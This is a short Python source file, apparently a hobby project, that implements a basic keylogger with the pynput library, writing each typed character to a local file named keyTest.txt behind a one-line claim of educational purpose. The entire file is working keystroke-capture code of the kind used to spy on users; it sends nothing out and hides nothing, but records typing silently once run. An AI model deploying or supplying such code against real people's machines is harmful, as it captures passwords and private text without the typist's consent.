
#Disclaimer: This is only for educational purpose and I am in no way using this project
# For any malicious activity on an individual or organization
from pynput import keyboard
def keyPress(key):
    print(str(key))
    with open('keyTest.txt', 'a') as fileKey:

        try:
            char = key.char
            fileKey.write(char)
        except:
            print("Error getting char!")
        



if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    input()